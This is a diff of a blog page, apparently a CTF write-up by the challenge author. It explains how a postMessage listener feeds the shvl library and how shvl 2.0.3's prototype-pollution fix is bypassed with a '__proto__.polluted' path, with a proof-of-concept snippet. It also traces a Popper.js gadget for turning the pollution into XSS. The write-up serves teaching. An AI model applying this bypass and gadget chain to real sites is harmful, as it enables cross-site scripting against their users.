@@ -3,7 +3,7 @@
 <head>
   <link href="https://gmpg.org/xfn/11" rel="profile">
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta name="generator" content="Hugo 0.86.1" />
+  <meta name="generator" content="Hugo 0.104.0" />
 
   
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -44,7 +44,7 @@
       </ul>
     </nav>
 
-    <p>&copy; 2021. All rights reserved. </p>
+    <p>&copy; 2022. All rights reserved. </p>
   </div>
 </aside>
 
@@ -65,51 +65,51 @@
 <p><img src="/images/cvq2NCk.png" alt="Challenge Page"></p>
 <h2 id="solving-the-challenge">Solving the challenge</h2>
 <p>Looking at the page&rsquo;s code, the content of the script tag should grab the user attention, especially where it defines an <code>eventListener</code>, which makes no source domain checks. Then, the library <a href="https://www.npmjs.com/package/shvl">shvl</a> parses the message and puts its content into a quote Object, whose content will be safely put on the web page. At the end of the execution, the library <a href="https://www.npmjs.com/package/@popperjs/core">Popper.js</a> is initialized to display a pretty tooltip when the user hovers the send button.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Javascript" data-lang="Javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">button</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#send-button&#39;</span>);
-<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">tooltip</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#send-tooltip&#39;</span>);
-<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">message</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#quote&#39;</span>);
-
-window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setup</span>(<span style="color:#a6e22e">e</span>) {
-    window.<span style="color:#a6e22e">removeEventListener</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#a6e22e">setup</span>);
-    <span style="color:#a6e22e">quote</span> <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;author&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;message&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>}
-    <span style="color:#a6e22e">shvl</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">quote</span>, Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">data</span>))[<span style="color:#ae81ff">0</span>], Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">data</span>))[<span style="color:#ae81ff">0</span>]);
-    <span style="color:#a6e22e">shvl</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">quote</span>, Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">data</span>))[<span style="color:#ae81ff">1</span>], Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">data</span>))[<span style="color:#ae81ff">1</span>]);
-    
-    <span style="color:#a6e22e">message</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">quote</span>)[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; — &#39;</span> <span style="color:#f92672">+</span> Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">quote</span>)[<span style="color:#ae81ff">0</span>]
-
-    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">popperInstance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Popper</span>.<span style="color:#a6e22e">createPopper</span>(<span style="color:#a6e22e">button</span>, <span style="color:#a6e22e">tooltip</span>, {
-        <span style="color:#a6e22e">placement</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;bottom&#39;</span>,
-        <span style="color:#a6e22e">modifiers</span><span style="color:#f92672">:</span> [
-            {
-            <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;offset&#39;</span>,
-            <span style="color:#a6e22e">options</span><span style="color:#f92672">:</span> {
-                <span style="color:#a6e22e">offset</span><span style="color:#f92672">:</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>],
-            },
-            },
-        ],
-    });
-});
-</code></pre></div><p>Looking a bit more at the source code it is also possible to identify that this message is intended to come from an iframe that chooses a random coach sentence and sends it through <code>postMessage</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML"><span style="color:#75715e">&lt;!-- https://small-talk.coach:1337/ --&gt;</span>
-&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;#quote-base&#39;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/quotes&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
-
-<span style="color:#75715e">&lt;!-- https://small-talk.coach:1337/quotes --&gt;</span>
-&lt;<span style="color:#f92672">script</span>&gt;
-    <span style="color:#a6e22e">phrases</span> <span style="color:#f92672">=</span> [
-        {<span style="color:#e6db74">&#39;@entrepreneur&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;The distance between your DREAMS and REALITY is called ACTION&#39;</span>},
-        {<span style="color:#e6db74">&#39;@successman&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;MOTIVATION is what gets you started, HABIT is what keeps you going&#39;</span>},
-        {<span style="color:#e6db74">&#39;@bornrich&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;It\&#39;s hard to beat someone that never gives up&#39;</span>},
-        {<span style="color:#e6db74">&#39;@businessman&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Work while they sleep. Then live like they dream&#39;</span>},
-        {<span style="color:#e6db74">&#39;@bigboss&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Life begins at the end of your comfort zone&#39;</span>},
-        {<span style="color:#e6db74">&#39;@daytrader&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;A successfull person never loses... They either win or learn!&#39;</span>}
-    ]
-
-    <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>(){
-        <span style="color:#a6e22e">index</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">floor</span>(Math.<span style="color:#a6e22e">random</span>() <span style="color:#f92672">*</span> <span style="color:#ae81ff">6</span>)
-        <span style="color:#a6e22e">parent</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#e6db74">&#39;{&#34;author&#34;: &#34;&#39;</span> <span style="color:#f92672">+</span> Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">phrases</span>[<span style="color:#a6e22e">index</span>])[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;, &#34;message&#34;: &#34;&#39;</span> <span style="color:#f92672">+</span> Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">phrases</span>[<span style="color:#a6e22e">index</span>])[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;}&#39;</span>, <span style="color:#e6db74">&#39;*&#39;</span>);
-    }, <span style="color:#ae81ff">0</span>)
-&lt;/<span style="color:#f92672">script</span>&gt;
-</code></pre></div><p>So, the challenge can be described as the following flow:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">button</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#send-button&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">tooltip</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#send-tooltip&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">message</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#quote&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setup</span>(<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">removeEventListener</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#a6e22e">setup</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">quote</span> <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;author&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;message&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">shvl</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">quote</span>, Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">data</span>))[<span style="color:#ae81ff">0</span>], Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">data</span>))[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">shvl</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">quote</span>, Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">data</span>))[<span style="color:#ae81ff">1</span>], Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">data</span>))[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">message</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">quote</span>)[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; — &#39;</span> <span style="color:#f92672">+</span> Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">quote</span>)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">popperInstance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Popper</span>.<span style="color:#a6e22e">createPopper</span>(<span style="color:#a6e22e">button</span>, <span style="color:#a6e22e">tooltip</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">placement</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;bottom&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">modifiers</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;offset&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">options</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">offset</span><span style="color:#f92672">:</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>],
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>        ],
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>Looking a bit more at the source code it is also possible to identify that this message is intended to come from an iframe that chooses a random coach sentence and sends it through <code>postMessage</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- https://small-talk.coach:1337/ --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;#quote-base&#39;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/quotes&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- https://small-talk.coach:1337/quotes --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">phrases</span> <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        {<span style="color:#e6db74">&#39;@entrepreneur&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;The distance between your DREAMS and REALITY is called ACTION&#39;</span>},
+</span></span><span style="display:flex;"><span>        {<span style="color:#e6db74">&#39;@successman&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;MOTIVATION is what gets you started, HABIT is what keeps you going&#39;</span>},
+</span></span><span style="display:flex;"><span>        {<span style="color:#e6db74">&#39;@bornrich&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;It\&#39;s hard to beat someone that never gives up&#39;</span>},
+</span></span><span style="display:flex;"><span>        {<span style="color:#e6db74">&#39;@businessman&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Work while they sleep. Then live like they dream&#39;</span>},
+</span></span><span style="display:flex;"><span>        {<span style="color:#e6db74">&#39;@bigboss&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Life begins at the end of your comfort zone&#39;</span>},
+</span></span><span style="display:flex;"><span>        {<span style="color:#e6db74">&#39;@daytrader&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;A successfull person never loses... They either win or learn!&#39;</span>}
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">index</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">floor</span>(Math.<span style="color:#a6e22e">random</span>() <span style="color:#f92672">*</span> <span style="color:#ae81ff">6</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">parent</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#e6db74">&#39;{&#34;author&#34;: &#34;&#39;</span> <span style="color:#f92672">+</span> Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">phrases</span>[<span style="color:#a6e22e">index</span>])[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;, &#34;message&#34;: &#34;&#39;</span> <span style="color:#f92672">+</span> Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">phrases</span>[<span style="color:#a6e22e">index</span>])[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;}&#39;</span>, <span style="color:#e6db74">&#39;*&#39;</span>);
+</span></span><span style="display:flex;"><span>    }, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>So, the challenge can be described as the following flow:</p>
 <ol>
 <li>An iframe is loaded and sends a <code>postMessage</code> with a random sentence to the parent page;</li>
 <li>Parent page parses the message into an object using <a href="https://github.com/robinvdvleuten/shvl">shvl</a> library;</li>
@@ -117,136 +117,136 @@ window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e
 <li><a href="https://github.com/popperjs/popper-core">Popper.js</a> is initialized.</li>
 </ol>
 <p>In this steps, the only input an attacker could control is the message from <code>eventListener</code> since it is not validating the domain source, however we will come to this later. Once <a href="https://github.com/robinvdvleuten/shvl">shvl</a> parses this input, lets take a look at how it works and if there is any known issue. Actually, a fast google search return lots of results informing about a prototype pollution vulnerability in <a href="https://snyk.io/vuln/SNYK-JS-SHVL-1054936">early versions of this library</a>. The only problem that remains is that this vulnerability is fixed in the last version of the library, as shown by these lines:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML"><span style="color:#75715e">&lt;!-- it was &lt;script src=&#34;https://unpkg.com/shvl@latest/dist/shvl.umd.js&#34;&gt;&lt;/script&gt; at the challenge time. --&gt;</span>
-&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://unpkg.com/shvl@2.0.3/dist/shvl.umd.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Javascript" data-lang="Javascript"><span style="color:#75715e">// Content of https://unpkg.com/shvl@2.0.3/dist/shvl.umd.js unminified
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">return</span> <span style="color:#f92672">!</span><span style="color:#e6db74">/^(__proto__|constructor|prototype)$/</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">path</span>) <span style="color:#f92672">&amp;&amp;</span> ...
-</code></pre></div><p>Looking deeper to this fix, we can see that the fix is implemented in this line: <code>return !/^(__proto__|constructor|prototype)$/.test(e)</code>. Nevertheless, since this regex tests only for these specific keywords in the entire path, due to the presence of <code>^</code> and <code>$</code> characters, an attacker still is able to enter prototype payloads such as <code>__proto__.polluted</code> and, therefore, this library still is vulnerable. The source code below shows this behavior:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Javascript" data-lang="Javascript"><span style="color:#a6e22e">quote</span> <span style="color:#f92672">=</span> {}
-<span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> {}
-<span style="color:#a6e22e">shvl</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">quote</span>, <span style="color:#e6db74">&#34;__proto__.polluted&#34;</span>, <span style="color:#e6db74">&#34;oi&#34;</span>);
-
-<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">polluted</span>)
-    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;is polluted!&#34;</span>)
-<span style="color:#66d9ef">else</span> 
-    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;is safe!&#34;</span>)
-    
-<span style="color:#75715e">// the message &#34;is polluted!&#34; is displayed in the last version of the library!
-</span></code></pre></div><p>Ok, now we have prototype pollution in an input in our control, but how this can be abused to achieve XSS? Well, the answer is in this <a href="https://github.com/BlackFan/client-side-prototype-pollution">repository</a>. To get XSS on a page vulnerable to prototype pollution, it is also necessary to find another piece of code or library on the page that modifies the DOM with its objects properties. Once its inserts into the DOM some parameter that we can pollute, we can manipulate what is going to be inserted (this is called gadget).
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- it was &lt;script src=&#34;https://unpkg.com/shvl@latest/dist/shvl.umd.js&#34;&gt;&lt;/script&gt; at the challenge time. --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://unpkg.com/shvl@2.0.3/dist/shvl.umd.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#75715e">// Content of https://unpkg.com/shvl@2.0.3/dist/shvl.umd.js unminified
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">return</span> <span style="color:#f92672">!</span><span style="color:#e6db74">/^(__proto__|constructor|prototype)$/</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">path</span>) <span style="color:#f92672">&amp;&amp;</span> ...
+</span></span></code></pre></div><p>Looking deeper to this fix, we can see that the fix is implemented in this line: <code>return !/^(__proto__|constructor|prototype)$/.test(e)</code>. Nevertheless, since this regex tests only for these specific keywords in the entire path, due to the presence of <code>^</code> and <code>$</code> characters, an attacker still is able to enter prototype payloads such as <code>__proto__.polluted</code> and, therefore, this library still is vulnerable. The source code below shows this behavior:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#a6e22e">quote</span> <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">shvl</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">quote</span>, <span style="color:#e6db74">&#34;__proto__.polluted&#34;</span>, <span style="color:#e6db74">&#34;oi&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">polluted</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;is polluted!&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;is safe!&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// the message &#34;is polluted!&#34; is displayed in the last version of the library!
+</span></span></span></code></pre></div><p>Ok, now we have prototype pollution in an input in our control, but how this can be abused to achieve XSS? Well, the answer is in this <a href="https://github.com/BlackFan/client-side-prototype-pollution">repository</a>. To get XSS on a page vulnerable to prototype pollution, it is also necessary to find another piece of code or library on the page that modifies the DOM with its objects properties. Once its inserts into the DOM some parameter that we can pollute, we can manipulate what is going to be inserted (this is called gadget).
 The idea of this challenge came up when I heard <a href="https://twitter.com/reefbr">@manoelt</a> speaking about an old java deserialization challenge. In that challenge, CTF players received a page with an easily identifiable insecure deserialization code and were expected to find the gadget to exploit that vulnerability. I found that idea so amazing that I asked myself why not do the same using prototype pollution?</p>
 <p>When the <a href="https://github.com/popperjs/popper-core">Popper</a> initializes one instance, it calls the function <a href="https://github.com/popperjs/popper-core/blob/master/src/createPopper.js#L53">Popper.createPopper</a>. In this function, the following loop will set up each <a href="https://popper.js.org/docs/v2/modifiers/">modifier</a>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Javascript" data-lang="Javascript"><span style="color:#66d9ef">let</span> <span style="color:#ae81ff">__</span><span style="color:#a6e22e">debug_loops__</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">index</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">index</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">orderedModifiers</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">index</span><span style="color:#f92672">++</span>) {
-    <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">__</span><span style="color:#a6e22e">DEV__</span>) {
-        <span style="color:#ae81ff">__</span><span style="color:#a6e22e">debug_loops__</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
-        <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">__</span><span style="color:#a6e22e">debug_loops__</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span>) {
-            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">INFINITE_LOOP_ERROR</span>);
-            <span style="color:#66d9ef">break</span>;
-        }
-    }
-
-    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">reset</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">true</span>) {
-        <span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">reset</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
-        <span style="color:#a6e22e">index</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-        <span style="color:#66d9ef">continue</span>;
-    }
-
-    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">fn</span>, <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {}, <span style="color:#a6e22e">name</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">orderedModifiers</span>[<span style="color:#a6e22e">index</span>];
-
-    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">fn</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;function&#39;</span>) {
-        <span style="color:#a6e22e">state</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fn</span>({ <span style="color:#a6e22e">state</span>, <span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">name</span>, <span style="color:#a6e22e">instance</span> }) <span style="color:#f92672">||</span> <span style="color:#a6e22e">state</span>;
-    }
-}
-</code></pre></div><p>In this snippet, all modifiers are going to be called in the line <code>state = fn({ state, options, name, instance }) || state;</code>. One of them is <a href="https://popper.js.org/docs/v2/modifiers/apply-styles/">applyStyles</a>, which allow users to set custom attributes to the elements used by the <a href="https://github.com/popperjs/popper-core">Popper</a>. These elements are passed by parameter to the <code>createPopper</code> and defined as <code>state.elements</code> Object <a href="https://github.com/popperjs/popper-core/blob/master/src/createPopper.js#L57">in these lines</a>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Javascript" data-lang="Javascript">)<span style="color:#f92672">:</span> <span style="color:#a6e22e">Instance</span> {
-    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">state</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">$Shape</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">State</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> {
-        <span style="color:#a6e22e">placement</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;bottom&#39;</span>,
-        <span style="color:#a6e22e">orderedModifiers</span><span style="color:#f92672">:</span> [],
-        <span style="color:#a6e22e">options</span><span style="color:#f92672">:</span> { ...<span style="color:#a6e22e">DEFAULT_OPTIONS</span>, ...<span style="color:#a6e22e">defaultOptions</span> },
-        <span style="color:#a6e22e">modifiersData</span><span style="color:#f92672">:</span> {},
-        <span style="color:#a6e22e">elements</span><span style="color:#f92672">:</span> {
-            <span style="color:#a6e22e">reference</span>,
-            <span style="color:#a6e22e">popper</span>,
-        },
-        <span style="color:#a6e22e">attributes</span><span style="color:#f92672">:</span> {},
-        <span style="color:#a6e22e">styles</span><span style="color:#f92672">:</span> {},
-    };
-</code></pre></div><p>When <code>applyStyles</code> function executes, it iterates over <code>state.elements</code>. Moreover, for any of them, it iterates again over its attributes! For any attribute with a value defined in the object, <code>setAttribute</code> is called and adds it to the final element in the DOM. Since <code>createPopper</code> received two elements reference (the button in which <a href="https://github.com/popperjs/popper-core">Popper</a> is enrolled) and the <a href="https://github.com/popperjs/popper-core">Popper</a> itself (a div), it is possible to insert properties into both elements by polluting <code>Object.prototype.reference.property</code> and <code>Object.prototype.popper.property</code>.</p>
